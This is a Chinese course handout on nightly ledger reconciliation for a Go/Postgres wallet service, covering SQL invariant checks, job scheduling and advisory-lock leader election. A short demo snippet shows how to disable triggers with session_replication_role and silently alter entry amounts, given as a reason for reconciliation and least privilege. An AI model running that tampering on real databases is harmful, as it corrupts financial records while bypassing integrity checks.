# EP20 讲义：对账与报表 —— 约束挡住坏数据，对账找出溜进来的

- **视频** `15:39:44 – 16:29:57`（50 分）｜分支 `ep20` ｜ diff：`+1131 / -7`（23 个文件）
- **转录** `media/ep20.txt`（199 句，6,222 词）
- 时间戳是视频绝对时间

一句话：**约束让你写不进坏数据，对账找出已经进去的。**

> `[15:41:27]` So **trust, and verify**. **Constraints keep bad data out, reconciliation finds what got in anyway** — and **the goal is to find it before a customer does, or an auditor.**

> **译文**：所以**信任，但要验证**。**约束把坏数据挡在外面，对账找出那些还是进来了的**——而**目标是在客户之前、或者在审计师之前发现它**。

💡 这一集在课程里的位置很特别：前 19 集都在**建东西**，这一集第一次**回头检查自己建的东西**。

```
EP02~EP19  让错误不可能发生   （触发器、外键、事务、幂等）
EP20       假设它还是发生了    （对账、指标、告警）
```

**"trust, and verify"** 是里根那句冷战名言（"Trust, but verify"）的变体。用在这里很贴：**约束是信任，对账是验证。**

---

## 0. 为什么"约束已经保证了正确"还要对账

> `[15:40:47]` Back in episode 2, **we made bad data hard to write**: every transaction must balance, checked by a trigger at commit; entries are append-only; balances are derived, never stored.

> **译文**：回到第 2 集，**我们让坏数据难以写入**：每笔交易必须平衡，提交时由触发器检查；分录是只能追加的；余额是推导出来的，从不存储。

那还检查什么？作者给了**四个理由**，每一个都是**约束在原理上或实践上管不到的**。

### 理由一：bug 可以是"完美平衡"的

> `[15:40:58]` **so I can't check anything, because a bug can be perfectly balanced.** **A capture that credits the wrong account still has debits equal to credits, and every constraint is happy.**

> **译文**：**所以约束什么也检查不出来，因为一个 bug 可以是完美平衡的。** **一笔把钱贷记到错误账户的 capture，借方仍然等于贷方，而所有约束都很满意。**

💡 这是**最重要的一条**，也最容易被误解放过：

```go
// 正确的
{from.ID, Debit, 100, "USD"}, {to.ID, Credit, 100, "USD"}

// bug：钱进了"别人的"钱包——但依然平衡
{from.ID, Debit, 100, "USD"}, {otherWallet.ID, Credit, 100, "USD"}
```

**触发器的检查是 `Σ debits = Σ credits`，不是 `to.ID == 期望的收款人`。** 复式记账保证的是**总量守恒**，不是**分配正确**。

> **这是一个极其重要的认知边界**：复式记账能抓住"钱多出来/少掉了"，抓不住"钱去了错误的地方"。
>
> 前者是**算术错误**，后者是**业务逻辑错误**。约束只管算术。

### 理由二：人会动手

> `[15:41:11]` **because people have hands**: someone fixes a support ticket with **a quick `UPDATE` in production**, and **a superuser can switch triggers off**.

> **译文**：**因为人有手**：某人为了修一个支持工单，**在生产环境来一句 `UPDATE`**，而**超级用户可以关掉触发器**。

💡 这一条在 §17 的演示里会**原样复现**：

```sql
SET session_replication_role = replica;   -- 关掉触发器（需要超级用户）
UPDATE entries SET amount = amount + 1000 WHERE transaction_id = '...';
```

**没有报错，没有告警，账本从此是错的。**

> `[16:01:33]` ...`session_replication_role` **is meant for replication tools, it fires no triggers**, so **nothing checks the update that follows**. **Only a superuser can switch it on — which is a good reason for the least-privilege roles in episode 21.**

> **译文**：……`session_replication_role` **本来是给复制工具用的，它不触发任何触发器**，所以**后面那条 update 没有任何东西检查**。**只有超级用户能打开它——这正是第 21 集最小权限角色的一个好理由。**

**这就是"约束"的第一个真实弱点：它能被有权限的人关掉。**

> 而"关掉它的能力"必须存在——**运维、迁移、灾难恢复都需要**。所以你没法只说"永远别关"。
>
> **你只能事后检查。** 这就是对账的存在理由。

### 理由三：迁移和双版本

> `[15:41:11]` ...**because of the price** — hmm, **a migration, a backfill, or two versions running side-by-side for a few minutes.** **Each step is valid on its own, and the sum isn't.**

> **译文**：……**因为价格**——不对，是：**一次迁移、一次回填，或者两个版本并排跑几分钟。** **每一步单独看都是有效的，而合起来就不是。**

💡 whisper 把 "because of the deploy" 听成了 "because of the price"。**原文是 deploy**（部署）。

这是**分布式系统里最经典的一类错误**：

```
v1 部署中：一部分实例还在跑旧代码
  旧代码：转账 = 1 个事务
  新代码：转账 = saga（hold → capture）

如果两者对同一笔转账都动手 → 双花
每一个动作都"合规"，组合起来是灾难
```

> 这也解释了为什么 EP12 的 saga 要**claim + 版本号**：它防的正是"两个 worker 都觉得自己该做"。

### 理由四：外部世界

> `[15:41:27]` **and because of the outside world: the bank never received a deposit we booked, and nothing in our database can know that.**

> **译文**：**还有外部世界：银行根本没收到我们记的那笔存款，而我们的数据库里没有任何东西能知道这件事。**

💡 这条最根本：**我们的数据库只知道自己**。

```
我们记账：客户存了 $500  →  settlement 账户 +500
银行那边：这笔钱没到（或者到了别的账户，或者被退回）
```

**数据库是自洽的，也是错的。** 只有**拿外部对账单来比**才能发现。

> `[15:42:46]` **External reconciliation is the other kind: our records against someone else's** — **the settlement account against the bank statement.**

> **译文**：**外部对账是另一种：我们的记录对别人的记录**——**settlement 账户对银行对账单。**

💡 所以课程里有两类对账：

| | 内部对账 | 外部对账 |
|---|---|---|
| 对谁 | **我们自己的账，自己对自己** | **我们 vs 银行/支付渠道** |
| 能发现 | bug、手工改、迁移错误、事件积压 | **钱真的没到 / 多收了 / 被扣费** |
| 频率 | 每晚 | 每天（等银行的对账单） |
| 本集实现 | ✅ 完整 | 只讲**形状**（§21） |

---

## 1. 内部对账：五项检查

> `[15:41:54]` There are two kinds. Internal reconciliation **checks our records against each other**, and we'll run it every night: **the trial balance — over every entry, debits equal credits in each currency**; **the same in each transaction**, which covers our 4-entry FX conversions too, since they balance per currency; **no customer's wallet below zero**; **the holds account from episode 12 holds exactly the money of the open holds, no more, no less**; and **a sanity check that isn't about money: every event leaves the outbox within 5 minutes**.

> **译文**：有两类。内部对账**拿我们自己的记录互相对照**，我们每晚跑一次：**试算平衡——对每一条分录，每种货币的借方等于贷方**；**每一笔交易内部也一样**，这顺带覆盖了我们四笔分录的 FX 换汇，因为它们按货币平衡；**没有客户的钱包低于零**；**第 12 集的 holds 账户正好持有那些未完成 hold 的钱，不多不少**；以及**一个与钱无关的健全检查：每个事件都在 5 分钟内离开 outbox**。

代码里它们是**五条 SQL**：

```go
var checks = []struct{ name, query string }{
	{"trial_balance", ...},          // 全局：每种货币 Σ(debit) = Σ(credit)
	{"unbalanced_transaction", ...}, // 局部：每笔交易每种货币也平衡
	{"overdrawn_wallet", ...},       // 没有钱包是负的
	{"holds_account", ...},          // holds 账户 = 未完成 hold 之和
	{"outbox_lag", ...},             // 最老的未发布事件 < 5 分钟
}
```

> `[15:57:47]` ...**each one is also short enough to paste into `psql` when you're investigating at three in the morning, which matters more than it sounds.**

> **译文**：……**每一条也短到能在凌晨三点排查时直接粘进 `psql`——这比听起来重要。**

💡 这句是**可运维性**的具体要求：**告警里的东西必须能被人手工执行。**

对比一下"不可运维"的对账实现：

```go
// ❌ 逻辑散在 Go 代码里
for _, tx := range allTransactions { ... }    // 你没法在 psql 里跑这个
```

```sql
-- ✅ 一条 SQL，随时能单独跑
SELECT 'all entries', currency, 0, sum(CASE direction WHEN 'debit' THEN amount ELSE -amount END)::bigint
FROM entries GROUP BY currency
HAVING sum(CASE direction WHEN 'debit' THEN amount ELSE -amount END) <> 0;
```

**"凌晨三点"是一个设计约束**：那个时刻的人**没有精力读代码，只有精力粘一条 SQL。**

### 一条巧妙的统一：每项检查返回同样的四列

> `[15:56:59]` **the checks are SQL, one query each, and every query returns only what breaks its invariant, always in the same four columns, so one loop can run them all.**

> **译文**：**这些检查是 SQL，每项一条查询，而每条查询只返回破坏它那条不变式的东西，永远在同样的四列里，所以一个循环就能跑完全部。**

```go
type Discrepancy struct {
	Check    string `json:"check"`
	Ref      string `json:"ref"`      // 出问题的那笔交易或那个账户
	Currency string `json:"currency"`
	Expected int64  `json:"expected"`
	Actual   int64  `json:"actual"`
}
```

```sql
-- 每条查询的返回形状都是 (ref, currency, expected, actual)
{"trial_balance",    `SELECT 'all entries',      currency, 0, sum(...)  ... `},
{"overdrawn_wallet", `SELECT b.account_id::text, b.currency, 0, b.balance ... `},
{"outbox_lag",       `SELECT 'outbox',           '',       300, extract(...) ... `},
```

💡 **"同样的四列"是一个接口设计**，而且它让加一项检查变成**加一个结构体字面量**：

> `[15:58:06]` **checks as data, in one list: adding a check is one more entry, and anyone can read every rule we enforce on one screen.**

> **译文**：**检查作为数据，在同一个列表里：加一项检查就是多一个条目，而任何人可以在一个屏幕上读完我们执行的每一条规则。**

💡 这是**"规则即数据"**，和 EP18 的 `exponents` 表、EP13 的 `checks` 是同一个模式：

| 集 | 规则写成 | 好处 |
|---|---|---|
| EP18 | `exponents` map | 加币种 = 加一行 |
| EP20 | `checks` slice | **加不变式 = 加一条 SQL** |

**而 "on one screen" 是关键**：如果你想知道"这个系统保证什么"，你**读一个 20 行的 slice 就够了**，不用翻 10 个文件。

### 那条不需要的检查

> `[15:42:17]` ...and **notice one check we don't need**: **many ledgers store a balance on each account for speed, and then they must check that it still equals the sum of its entries.** **Ours are derived, so there's nothing to drift.**

> **译文**：……而**注意有一项我们不需要的检查**：**很多账本为了速度在每个账户上存一个余额，然后它们必须检查那个余额还等于它所有分录的和。** **我们的余额是推导出来的，所以没有任何东西会漂移。**

💡 这是 EP02 那个决策的**延期回报**，而且回报的形式很具体：

| | 存余额（缓存） | 推导余额（我们） |
|---|---|---|
| 读余额 | `SELECT balance`（快） | `SELECT sum(...)`（慢） |
| 需要的检查 | +1 项（余额 vs 分录之和） | **0** |
| 可能的 bug | **余额漂移**（并发更新、漏更新） | **不可能** |

**"没有东西会漂移"意味着"这类 bug 不存在"，而不只是"这类 bug 少"。**

> 代价是**每次读余额都要聚合**。而这个代价在第 5 集已经付掉了（`account_balances` 视图 + 索引），并且在真的大到不行的时候有标准答案（物化视图 / 定期快照）。
>
> **先选不可能错的形状，再优化它。** 反过来做（先存余额求快，再加检查）意味着你要**永远维护那个检查**。

### outbox lag：一个"钱之外"的检查

```sql
{"outbox_lag", `SELECT 'outbox', '', 300,
    extract(epoch FROM now() - min(created_at))::bigint
  FROM outbox WHERE published_at IS NULL
  HAVING min(created_at) < now() - interval '5 minutes'`},
```

💡 三项设计细节：

1. **`expected = 300`（秒）** —— 阈值被写进了 discrepancy 里，所以**告警消息自带标准**
2. **`HAVING` 而不是 `WHERE`** —— 只有超时才返回行（`min` 是聚合，必须用 `HAVING`）
3. **返回"年龄"而不是"数量"** —— 100 条 1 秒前的事件是健康的；1 条 10 分钟前的事件是故障

> **"返回年龄"是一个通用技巧**：对"积压"类监控，**最老的那条的年龄**比**数量**更能说明问题。
>
> 数量会随流量波动（峰值 100 条正常），年龄不会。

---

## 2. 规模：全表扫描能撑很久

> `[15:42:30]` **These checks scan the whole ledger, which is fine for a long time.** At real scale, **two common answers**: **run them on a read replica**, or **reconcile incrementally**, checking only the transactions since the last run, and **carrying yesterday's totals forward**.

> **译文**：**这些检查扫描整个账本，这在很长一段时间内都没问题。** 到真实规模，**两个常见答案**：**在只读副本上跑**，或者**增量对账**，只检查上次运行之后的交易，并把昨天的总额结转过来。

💡 三条路，代价不同：

| 方案 | 做法 | 代价 |
|---|---|---|
| **全表扫描**（我们） | `SELECT sum(...) FROM entries` | **O(全表)**，简单、**无状态** |
| **只读副本** | 同上，但在 replica 上 | 需要运维一个副本；**有复制延迟** |
| **增量** | 只查上次之后的 + 结转总额 | 快，但**引入状态**（一个错就永远错） |

💡 第三条的**风险**值得说清：

```
增量对账的隐含假设：昨天的总额是对的
如果昨天错了一笔，而今天只查"新增" → 错的那笔永远不会被再检查
```

**全表扫描没有这个属性**：它**每次都重新证明整个账本是对的**。所以：

> **"简单但慢"的对账比"快但有状态"的对账更可信。** 在能承受的时候，选前者。

> 而 `[15:42:40]` "At real scale" 这个词很关键：**现在不是真实规模**。这又是 "measure before you get clever"（EP06）的同一条原则。

---

## 3. 调度器放哪：`cmd/jobs` 还是 wallet 里

> `[15:43:06]` **Checks that run every night need a scheduler. Where should it live?** **One option is a jobs worker of its own, `cmd/jobs`**, but **it would read the wallet's database from outside**, and **we've kept every database private to its service since episode 1.**

> **译文**：**每晚跑的检查需要一个调度器。它该住在哪？** **一个选项是它自己的 jobs worker，`cmd/jobs`**，但**那样它会从外面读 wallet 的数据库**，而我们**从第 1 集起就让每个数据库只属于它的服务**。

> `[15:43:28]` **Inside, it's nothing new.** **A worker keeps heavy queries away from the API — that's the real tradeoff, and at 2 in the morning, it's one we can afford.**

> **译文**：**放在里面，没有任何新东西。** **一个独立的 worker 能让重查询远离 API——那才是真正的取舍，而在凌晨两点，这个取舍我们负担得起。**

💡 这是一个**清晰的取舍陈述**，值得拆开：

| | 独立 `cmd/jobs` 服务 | 放在 wallet 里 |
|---|---|---|
| 数据库边界 | **破坏**（外部读 wallet 库） | 保持 |
| 重查询隔离 | ✅ 完全不碰 API 进程 | ❌ **和 API 共享连接池、CPU** |
| 运维成本 | +1 镜像、+1 配置、+1 告警 | **0** |
| 部署单元 | 2 个 | 1 个 |

**作者选了后者，理由是两个**：

1. **数据库私有性是一条已经坚持了 19 集的规则**，为了一次夜间任务破例不值得
2. **"凌晨两点"** —— 对账在夜里跑，那时 API 的负载最低，**共享资源的冲突最轻**

💡 第 2 点是最有意思的：**它把"取舍"和"时刻"绑定**。

> 如果对账在**中午**跑，共享连接池会伤到 API（对账要扫全表，可能占住几秒的 CPU 和 IO）。**在凌晨两点，没有人会用那个 API。**
>
> **所以"放在同一个进程里"这个决定，和"在凌晨两点跑"这个决定是互相依赖的。** 改一个，另一个可能就不成立。

**这正是 `At: 2 * time.Hour` 这个默认值背后的真正理由之一**——不只是 §6 的"昨天还没结束"，还有"别和 API 抢资源"。

> `[15:43:40]` **In replicas, one worker is a single point of failure**; **the wallet runs as many replicas as the API needs**, and **we don't want free reconciliations every night.**

> **译文**：**在有副本的部署里，一个 worker 是单点故障**；**wallet 按 API 的需要跑多个副本**，而**我们不想要每晚 N 次免费的对账**。

💡 这里 whisper 把 "**N reconciliations**" 听成了 "**free reconciliations**"。原文是 **"we don't want N reconciliations every night"**。

这就是**为什么需要选主**：不是因为"效率"，而是因为**正确性**：

```
3 个副本 × 每晚 1 次 = 每晚 3 次对账

后果 1：历史表里 3 行同 slot 的记录 → 你不知道该信哪个
后果 2：3 倍的数据库负载，在最不需要的时候
后果 3（最严重）：如果对账是"读+写"（例如自动修复），3 个并发实例会互相踩
```

> **我们的对账是只读的**，所以第 3 点暂时不成立。但**历史表是写的**，所以第 1 点成立——而 `job_runs` 的 `UNIQUE (job, slot)` 就是为此设的（§5）。

---

## 4. `job_runs`：`UNIQUE (job, slot)` 是 fencing

```sql
-- 000008_job_runs.up.sql
CREATE TABLE job_runs (
    id          bigint      GENERATED ALWAYS AS IDENTITY PRIMARY KEY,
    job         text        NOT NULL,
    slot        timestamptz NOT NULL,
    status      text        NOT NULL DEFAULT 'running'
                            CHECK (status IN ('running', 'succeeded', 'failed')),
    summary     jsonb,
    started_at  timestamptz NOT NULL DEFAULT now(),
    finished_at timestamptz,
    UNIQUE (job, slot)
);
```

> `[15:44:22]` **the unique constraint on `job` and `slot` is the important line: a slot can only run once**, **even if two replicas both believe they are the leader.**

> **译文**：**`job` 和 `slot` 上的唯一约束是最重要的那一行：一个 slot 只能跑一次**，**即便两个副本都认为自己才是 leader。**

💡 这是本集**最深的一句话**，它把"选主"从**正确性依赖**降级成了**效率优化**：

```
如果没有 UNIQUE (job, slot)：
   选主出了任何 bug → 同一个 slot 跑两次 → 历史错乱 + 数据库双倍负载
   → 选主必须是"绝对可靠"的    ← 而分布式选主很难做到绝对可靠

有 UNIQUE (job, slot)：
   选主出错 → 第二个 INSERT 冲突 → 直接 return，什么都不做
   → 选主只需要"通常可靠"
```

> `[15:50:29]` ...**between losing the session and noticing, a few seconds can pass where two replicas both think they lead. That's why `job_runs` has its unique slot: that constraint is our fencing.**

> **译文**：……**在失去会话和发现之间，可能过去几秒，而在那几秒里两个副本都认为自己才是 leader。这就是为什么 `job_runs` 有它的唯一 slot：那个约束就是我们的围栏。**

💡 "**fencing**"（围栏）是一个分布式系统的正式术语（fencing token）。作者在 §13 会说明**什么时候需要真正的 fencing token**，这里先用约束顶着：

| 机制 | 强度 | 成本 |
|---|---|---|
| `UNIQUE (job, slot)` | 防**重复执行** | 一个索引 |
| **fencing token**（单调递增数） | 防**旧 leader 的写**生效 | 每次写都要检查 |
| 无 | 双跑 | 0 |

> `[15:50:46]` **where the leader could do real damage, you'd go further, with a fencing token — a number that grows with every new leader, checked by every write.** **Our jobs mostly read, so the unique slot is enough.**

> **译文**：**在 leader 可能造成真实损害的地方，你会走得更远，用 fencing token——一个每次换 leader 就增长的数，每次写都检查它。** **我们的任务主要是读，所以唯一 slot 就够了。**

💡 这个判断的**边界**很清楚：

```
我们的对账:  读全表 → 算 → 写一行 summary
             ↑ 即使双跑，第二次被 UNIQUE 挡住 → 只读一次

如果有"自动修复": 读 → 改账 → 写
             ↑ 双跑可能改两次（每次都是"合理的修复"）→ 需要 fencing token
```

**"mostly read" 是这个简化成立的全部理由。** 而作者把它说出来了——这是好的设计陈述。

### `status` 有一个 `running` 初值

```sql
status text NOT NULL DEFAULT 'running' CHECK (status IN ('running','succeeded','failed'))
```

💡 这意味着**"claim"和"开始"是同一个动作**：

```
INSERT INTO job_runs (job, slot) VALUES ($1, $2)   ← status 默认 'running'
  ↓
跑完了 → UPDATE ... SET status='succeeded', summary=..., finished_at=now()
```

**好处**：如果进程在跑的中途被 `kill -9`，那一行会**永远停在 `running`**。

> **而"永远 running 的行"是一个信号**：它告诉你"这一晚的对账没跑完"。
>
> 如果 status 只有 `succeeded/failed`，那一行就不会存在——**而"不存在"和"没跑"无法区分**。

**这是一个"用状态表达进行中"的实例**，和 EP07 幂等键的 `in_progress` 完全同构：

| | EP07 幂等键 | EP20 job_runs |
|---|---|---|
| 进行中 | `status='in_progress'` | `status='running'` |
| 完成 | `status='completed'` + 响应 | `status='succeeded'` + summary |
| 失败 | （claim 过期） | `status='failed'` + error |

---

## 5. `Next()`：一行算术，所有副本算出同一个时间

```go
// Next returns when j is next due after t: At past a multiple of Every, counted
// from midnight UTC. Every replica works out the same times, without talking.
func (j Job) Next(t time.Time) time.Time {
	return t.Add(-j.At).Truncate(j.Every).Add(j.Every + j.At)
}
```

> `[15:45:57]` **`Next` works out when the job is due: `At` past a multiple of `Every`, counted from midnight UTC.** **`Truncate` does the work, so every replica computes exactly the same slots without talking to each other** — **a slot is a name for a run that everybody agrees on.**

> **译文**：**`Next` 算出这个任务什么时候该跑：从 UTC 午夜起算的每个 `Every` 倍数之后再过 `At`。** **`Truncate` 做这个活，所以每个副本算出完全相同的 slot，彼此不用说话**——**一个 slot 就是一次运行的"名字"，而所有人对这个名字有共识。**

💡 这个函数短到只有一行，但它是**分布式协调的极简形态**。拆开看：

```go
t.Add(-j.At)              // 把 t 往回推 2 小时
 .Truncate(j.Every)       // 截断到 24 小时的整数倍
 .Add(j.Every + j.At)     // 加回 24 + 2 小时
```

**为什么先减再截断再加**？因为 `Truncate` 是**对绝对时间轴**做的（Unix 纪元起算），而我们要的是"**每天 02:00**"，不是"从 t 开始的每 24 小时"。

验算 `Every=24h, At=2h`：

| t | t-2h | Truncate(24h) | +26h | 结果 |
|---|---|---|---|---|
| `01:00` 今天 | `23:00` 昨天 | `00:00` 昨天 | `02:00` 今天 | ✅ |
| `03:00` 今天 | `01:00` 今天 | `00:00` 今天 | `02:00` 明天 | ✅ |
| `02:00:00` 今天 | `00:00` 今天 | `00:00` 今天 | `02:00` 明天 | ✅ **正好 02:00 时返回明天** |

> `[15:54:04]` **a daily job at 2 in the morning**: **1 second before 2, it's due at 2**; **at 2 exactly, it's due tomorrow**, **because this slot is the one running now**.

> **译文**：**一个每天凌晨两点的任务**：**差一秒到两点时，它下次到期是两点**；**正好两点时，它下次到期是明天**，**因为当前这个 slot 就是正在跑的那个**。

💡 **"at exactly 2, next is tomorrow"** 这一条是**幂等性的关键**：如果正好 02:00 时 `Next` 返回"今天 02:00"，那么 `Runner` 会**立刻再跑一次同一个 slot**（`time.Until(slot) <= 0`），然后被 `UNIQUE` 挡住，然后**下一轮还是同一个 slot**——**死循环**。

> **"Next 必须严格大于 t"是一个必须成立的性质。** 测试里也明确验了：`"next must never return it twice"`（[15:54:19]）。

### `At` 只是一个偏移，所以任何周期都能用

> `[15:54:39]` **`At` is just an offset, and it works for any period, which is why our demo only has to change `Every`.**

> **译文**：**`At` 只是一个偏移，它对任何周期都有效，这就是为什么我们的演示只需要改 `Every`。**

💡 演示里对账从 **24 小时**改成 **15 秒**，只改了 `Every`：

```
Every = 24h, At = 2h    →  每天 02:00 UTC
Every = 15s, At = 2h    →  每 15 秒（偏移 2 小时仍然成立，只是落在 15 秒网格上）
```

**为什么能这样？** 因为 `At` 被当作**偏移量**而不是"时刻"：

```go
t.Add(-j.At).Truncate(j.Every)     // At 参与平移
```

**如果实现成 `Truncate(24h).Add(At)`**（先截断再加），那么 `Every=15s` 就会变成"每天 00:00 + 2h"，**完全不 work**。

> **"偏移"和"时刻"的区别，在这一行里体现得非常具体。** 写对了，一个参数就够；写错了，你需要两套配置。

### 为什么是凌晨两点而不是午夜

> `[15:45:57]` **Why two in the morning and not midnight?** **A transaction's timestamp is when it began, not when it committed.** **A transfer that starts a millisecond before midnight can commit just after.** **Run at midnight sharp, and yesterday can still change under you. Two hours later, yesterday is over.**

> **译文**：**为什么是凌晨两点而不是午夜？** **一笔交易的时间戳是它开始的时间，不是它提交的时间。** **一笔在午夜前一毫秒开始的转账，可能在午夜之后才提交。** **在午夜整点跑，昨天还会在你脚下变化。两小时之后，昨天就结束了。**

💡 这是一个**极其精细的观察**，而且它用的是本课程自己的知识：

```
EP20 的对账查询：WHERE e.created_at < @before     ← 用的是 created_at
EP02 的 created_at：DEFAULT now()                  ← 事务开始时的时间
```

**Postgres 的 `now()` 返回的是"当前事务开始的时间"**，而不是"这条 INSERT 执行的时刻"。所以：

```
T=23:59:59.999  事务 A 开始  → now() = 23:59:59.999
T=00:00:00.500  事务 A 提交  → 但它的 created_at 仍然是 23:59:59.999
```

**如果对账在 00:00:00 跑**，查询 `created_at < '00:00:00'` 会**包含**这条尚未提交（或刚提交）的交易——但你看状态可能是**看不到它**（如果它还没提交）。

**结果：你会发现一个不平衡，而那个"不平衡"只是因为你看到了交易的"一半"。**

> 两小时之后，**所有凌晨前开始的事务都已经提交或回滚完毕**（假设没有超长事务），所以"昨天"是稳定的。

💡 而这里还有一个更深的原则：

> **对账的"截止时间"必须早于"运行时间"，中间要留出"在途事务"的窗口。**
>
> 留多长？**取决于你最长的那个事务有多长。** 我们的是转账（含 saga，秒级），所以 2 小时**极其宽裕**。

> 如果系统里有"跑 6 小时的对账/报表事务"，那么这个窗口就得比 6 小时更长——**否则你会周期性地报出一个假的不平衡。**

---

## 6. `Runner`：每个 job 一个 goroutine

```go
func (r *Runner) Run(ctx context.Context) {
	var wg sync.WaitGroup
	for _, j := range r.jobs {
		wg.Go(func() {
			for {
				slot := j.Next(time.Now())
				select {
				case <-ctx.Done():
					return
				case <-time.After(time.Until(slot)):
					r.run(ctx, j, slot)
				}
			}
		})
	}
	wg.Wait()
}
```

> `[15:46:42]` **Since Go 1.22, every turn of a loop has its own `j`, so each goroutine gets its own job, with no copying by hand.**

> **译文**：**从 Go 1.22 起，循环的每一轮有自己的 `j`，所以每个 goroutine 拿到自己的任务，不用手工复制。**

💡 这是 Go 1.22 那个**循环变量语义变更**的实际用法。对比：

```go
// Go 1.21 及之前：所有 goroutine 共享同一个 j 变量！
for _, j := range r.jobs {
	go func() { ... j ... }()      // ❌ 全都会看到最后一个 j
}

// Go 1.21 的写法必须是
for _, j := range r.jobs {
	j := j                          // ← 手工复制，人人都在写
	go func() { ... j ... }()
}

// Go 1.22 之后：自动就是每轮一个新变量 ✅
```

> **这个变更修掉了 Go 史上最常见的 bug 之一。** 而这里的写法（`wg.Go` + 裸用 `j`）**依赖 1.22+**。
>
> 如果你在维护一个 `go 1.21` 的模块，同样的代码**会编译通过，但行为是错的**。**这类"语义变更"比 API 变更危险得多**——因为编译器不提醒你。

> `[15:46:57]` **and because the next slot is computed after a run finishes, a slow run never causes a pileup** — **missed slots are simply skipped.**

> **译文**：**而因为下一个 slot 是在一次运行结束之后才计算的，慢的运行永远不会造成堆积**——**错过的 slot 就是被跳过。**

💡 这是一个**背压**的隐式实现，值得和 EP13 对比：

| | EP13 notification | EP20 Runner |
|---|---|---|
| 慢处理的后果 | `MaxAckPending` 挡住，服务器少投 | **跳过错过的 slot** |
| 有没有"补跑" | 有（消息在流里等着） | **没有**（slot 过去了就是过去了） |
| 为什么可以不同 | 每封邮件都必须发 | **对账跑一次就够了**，补跑 5 次没意义 |

> **"跳过"在这里是对的**：如果对账慢了 3 小时，你不需要"补跑三次"，你需要**跑一次当前的**。
>
> **因为它检查的是"当前状态"，不是"某个时刻的事件"。** 这和邮件（每个事件都要一个动作）根本不同。

### 慢的 run 会被 deadline 取消

```go
runCtx, cancel := context.WithDeadline(ctx, j.Next(slot))   // ← 下一个 slot 的时间
```

> `[15:47:28]` **a run gets a deadline: the next slot.** **A run that takes longer is cancelled, so two runs of the same job can never overlap, on one replica or across them.**

> **译文**：**一次运行拿到一个 deadline：下一个 slot。** **跑得更久的会被取消，所以同一个任务的两个运行永远不会重叠，无论在一个副本上还是跨副本。**

💡 这一行让"不重叠"有了**两层保证**：

| 层 | 机制 | 防的是 |
|---|---|---|
| 单副本 | `deadline = next slot` | **同一个 goroutine 里**的两次运行重叠 |
| 跨副本 | `UNIQUE (job, slot)` | **两个副本**跑同一个 slot |
| 跨副本（弱） | advisory lock | 通常只有一个副本在跑 |

**三层里只有前两层是硬保证。** advisory lock 是"通常"，所以作者在 §4 说它是 fencing 的**辅助**而不是主体。

---

## 7. 选主：五种方案的对比

> `[15:47:58]` **Now, which replica runs them?** **The classic answer is cron on one machine; that machine dies, and nobody notices for a week.**

> **译文**：**那么，哪个副本跑它们？** **经典答案是一台机器上的 cron；那台机器死了，而一个星期没人发现。**

💡 "**nobody notices for a week**" 精确描述了 cron 的失败模式：**它不报错，它只是不再发生了。**

> `[15:45:20]` **a check that silently stops running looks exactly like a ledger that's fine.**

> **译文**：**一个静默停止运行的检查，看起来和一个没问题的账本一模一样。**

💡 这两句是本集**最应该背下来的**。它说明了一个反直觉的事实：

> **监控系统的失效是"沉默"的，而沉默和被监控对象健康时的表现完全一样。**
>
> 所以"对账"这个机制**自己也需要被监控**——这就是 `job_runs` 里 `status` 和 `finished_at` 的用处，以及 `[15:45:20]` 那句 "an alert can notice when a nightly job hasn't succeeded for a day and a bit"（**告警可以注意到一个夜间任务已经一天多一点没成功过了**）。

**监控的监控。** 这是本集一个隐含的主题。

四种方案，作者逐个否掉：

| 方案 | 问题 |
|---|---|
| **cron 在一台机器上** | 机器死了没人发现 |
| **Redis `SET NX` + TTL** | **Redis 是我们的缓存**，故障切换可能丢锁 → **两个 leader** |
| **Kubernetes Lease** | 只在 Kubernetes 里（第 23 集） |
| **Postgres advisory lock** | ✅ **选它** |

> `[15:48:38]` **It works, but you have to get renewals, expiry and clock skew right.** **Redis, with `SET NX` and a TTL — but Redis is our cache, and a failover can lose the lock, so two replicas lead at once.**

> **译文**：**它能用，但你得把续期、过期和时钟偏移都搞对。** **Redis，用 `SET NX` 加一个 TTL——但 Redis 是我们的缓存，而一次故障切换可能丢掉那把锁，于是两个副本同时当 leader。**

💡 三个具体的坑，每个都是真实事故来源：

1. **续期（renewal）** —— 你必须**在 TTL 到期前**续，而且续期失败要**主动放弃**
2. **过期（expiry）** —— TTL 太长 → 死掉的 leader 挡路太久；太短 → **网络抖动就换主**
3. **时钟偏移（clock skew）** —— 客户端时间 vs Redis 时间不一致 → **TTL 判断错**

> 而 `[15:48:48]` 那句 "**Redis is our cache**" 是最致命的：**缓存的可用性等级低于数据库**。你可以在缓存丢数据时继续服务，所以缓存**天然允许丢锁**。
>
> **把一个正确性依赖放在"允许丢数据"的组件上，是架构错误。**

> `[15:48:59]` **Postgres advisory lock: it's a lock on a number** — **that means whatever we want it to mean** — **held by a database session.** **When the session ends, for any reason — a crash, a network failure, a deploy — Postgres releases the lock immediately. The lock lives where the data lives. No new dependency, and if Postgres is down, there's nothing to reconcile anyway.**

> **译文**：**Postgres advisory lock：它是对一个数字的锁**——**那个数字的意思由我们定义**——**由一个数据库会话持有。** **当那个会话结束，不管是为什么——崩溃、网络故障、部署——Postgres 立刻释放这把锁。锁和数据住在同一个地方。没有新的依赖，而且如果 Postgres 挂了，反正也没有东西需要对账。**

💡 四个优点，最后一条特别漂亮：

> **"if Postgres is down, there's nothing to reconcile anyway"**

这不是回避问题，而是**正确性论证**：对账的**对象**就是 Postgres 里的数据。**如果它挂了，我们本来也无法对账。**

**所以选主的可用性要求 ≤ 被管理资源的可用性要求。** 这就是为什么用 Postgres 选主是"免费的"：

| 选主依赖 | 可用性要求 |
|---|---|
| Redis | **高于** Postgres → 需要额外保证 ❌ |
| ZooKeeper/etcd | 高于 → 新增一个必须高可用的组件 ❌ |
| **Postgres** | **等于** → 本来就要它活着 ✅ |

💡 而 `hashtext` 那个细节也值得看：

```sql
SELECT pg_advisory_lock(hashtext($1))       -- 而不是 pg_advisory_lock(42)
```

> `[15:52:22]` ...**the readable string, rather than a magic number** — `pg_advisory_lock(hashtext($1))`, **which turns a readable name into the number Postgres wants.**

> **译文**：……**一个可读的字符串，而不是一个魔法数字**——`pg_advisory_lock(hashtext($1))`，**它把一个可读的名字转成 Postgres 想要的那个数字。**

```go
NewElector(dsn, "wallet_jobs", logger)     // 而不是 NewElector(dsn, "42", logger)
```

💡 **`hashtext` 有碰撞可能**（两个不同字符串映射到同一个 int32），这意味着**两个不相关的锁可能互相阻塞**。

**后果**：不会错（只是**多等一会儿**），但会**奇怪地慢**。而用一个魔法数字 `42`，你会遇到**更糟的问题**：**某天另一个团队也用了 42**。

